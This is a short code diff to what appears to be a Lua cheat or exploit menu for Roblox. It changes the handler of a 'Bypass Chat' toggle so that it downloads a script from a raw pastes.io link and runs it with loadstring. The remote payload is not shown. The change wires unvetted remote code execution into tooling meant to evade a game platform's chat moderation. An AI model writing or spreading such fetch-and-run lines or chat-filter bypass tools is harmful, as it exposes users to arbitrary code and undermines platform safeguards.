@@ -33,7 +33,7 @@ end)
 page4:Ti("6vain.exe")
 
 page4:Toggle("Bypass Chat",nil, function(value)
-    print(value)
+    loadstring(game:HttpGet('https://pastes.io/raw/lstrrfipqq'))();
 end)
 
 page4:Button("Q-TOOL", function(value)
